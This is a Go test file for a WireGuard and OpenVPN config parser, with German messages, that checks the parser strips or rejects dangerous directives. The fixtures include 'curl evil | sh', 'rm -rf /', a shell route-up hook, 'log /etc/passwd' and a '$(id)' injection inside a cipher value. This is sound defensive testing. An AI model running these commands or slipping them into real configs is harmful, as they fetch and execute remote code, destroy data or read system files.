package exits

import (
	"encoding/base64"
	"net"
	"strings"
	"testing"
)

func key(b byte) string {
	return base64.StdEncoding.EncodeToString([]byte(strings.Repeat(string(rune(b)), 32)))
}

func TestParseWG(t *testing.T) {
	conf := "[Interface]\nPrivateKey = " + key('a') + "\nAddress = 100.64.1.2/32, fd00::2/128\nDNS = 10.255.255.1, fd00::1\n" +
		"PostUp = curl evil | sh\nPreDown = rm -rf /\nTable = off\n\n[Peer]\nPublicKey = " + key('b') +
		"\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = us-east.example.com:443\n"
	w, err := ParseWG(conf)
	if err != nil {
		t.Fatal(err)
	}
	if w.Address.String() != "100.64.1.2/32" || len(w.DNS) != 1 || w.DNS[0] != "10.255.255.1" || w.Endpoint != "us-east.example.com:443" {
		t.Fatalf("falsch gelesen: %+v", w)
	}
	if strings.Join(w.Removed, ",") != "PostUp,PreDown,Table" {
		t.Fatalf("entfernt: %v", w.Removed)
	}
	sc := w.SetConf("1.2.3.4:443")
	for _, bad := range []string{"PostUp", "curl", "Table", "::/0", "DNS"} {
		if strings.Contains(sc, bad) {
			t.Fatalf("%q in setconf:\n%s", bad, sc)
		}
	}
	if !strings.Contains(sc, "AllowedIPs = 0.0.0.0/0") || !strings.Contains(sc, "Endpoint = 1.2.3.4:443") {
		t.Fatal(sc)
	}
	for name, c := range map[string]string{
		"zwei Peers":   conf + "[Peer]\nPublicKey = " + key('c') + "\n",
		"kein Key":     strings.Replace(conf, key('a'), "abc", 1),
		"Abschnitt":    conf + "[Evil]\nx=1\n",
		"Endpoint":     strings.Replace(conf, "us-east.example.com:443", "a b;c:1", 1),
		"nur IPv6":     strings.Replace(conf, "100.64.1.2/32, ", "", 1),
		"Zeile drauß.": "Foo = bar\n" + conf,
	} {
		if _, err := ParseWG(c); err == nil {
			t.Errorf("%s: Fehler erwartet", name)
		}
	}
}

func TestResolveEndpoint(t *testing.T) {
	look := func(string) ([]net.IP, error) {
		return []net.IP{net.ParseIP("2001:db8::1"), net.ParseIP("198.51.100.7")}, nil
	}
	if ep, err := ResolveEndpoint("vpn.example.com:51820", look); err != nil || ep != "198.51.100.7:51820" {
		t.Fatal(ep, err)
	}
	if ep, _ := ResolveEndpoint("[2001:db8::5]:443", look); ep != "[2001:db8::5]:443" {
		t.Fatal(ep)
	}
}

const pem = "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----"

func TestParseOVPN(t *testing.T) {
	conf := "client\ndev tun\nproto udp\nremote us.example.com 1194\nremote us2.example.com 443 tcp\n" +
		"auth-user-pass\nup /etc/openvpn/update-resolv-conf\ndown /tmp/x.sh\nscript-security 2\n" +
		"route-up \"/bin/sh -c id\"\nredirect-gateway def1\nroute 0.0.0.0 0.0.0.0\nblock-outside-dns\n" +
		"management 0.0.0.0 7505\nlog /etc/passwd\nplugin /lib/x.so\nsetenv FOO bar\ncipher AES-256-GCM\n" +
		"<ca>\n" + pem + "\n</ca>\n<tls-crypt>\n-----BEGIN OpenVPN Static key V1-----\nab\n-----END OpenVPN Static key V1-----\n</tls-crypt>\n" +
		"<connection>\nremote x 1\n</connection>\n"
	o, err := ParseOVPN(conf)
	if err != nil {
		t.Fatal(err)
	}
	if !o.NeedAuth || o.Remote != "us.example.com 1194" {
		t.Fatalf("%+v", o)
	}
	for _, bad := range []string{"up ", "down", "script-security 2", "route-up", "redirect-gateway", "route 0", "block-outside",
		"management", "log ", "plugin", "setenv", "dev tun", "auth-user-pass", "<connection>"} {
		if strings.Contains(o.Config, bad) {
			t.Errorf("%q nicht entfernt:\n%s", bad, o.Config)
		}
	}
	full := o.Full("ex3", "/etc/vpn/exits/ex3.auth")
	for _, want := range []string{"dev ex3\n", "route-noexec\n", "script-security 1\n", "pull-filter ignore \"redirect-gateway\"",
		"auth-user-pass /etc/vpn/exits/ex3.auth\n", "cipher AES-256-GCM\n", "<ca>\n" + pem + "\n</ca>"} {
		if !strings.Contains(full, want) {
			t.Errorf("%q fehlt:\n%s", want, full)
		}
	}
	base := "client\nremote a.example.com 1194\n<ca>\n" + pem + "\n</ca>\n"
	for name, c := range map[string]string{
		"Datei-CA":    "client\nremote a 1\nca /etc/ssl/ca.crt\n",
		"keine CA":    "client\nremote a 1\n",
		"kein remote": "client\n<ca>\n" + pem + "\n</ca>\n",
		"tap":         base + "dev-type tap\n",
		"Argument":    base + "cipher $(id)\n",
		"offen":       "client\nremote a 1\n<ca>\n" + pem + "\n",
		"leere CA":    "client\nremote a 1\n<ca>\nfoo\n</ca>\n",
		"secret":      base + "secret static.key\n",
	} {
		if _, err := ParseOVPN(c); err == nil {
			t.Errorf("%s: Fehler erwartet", name)
		}
	}
}
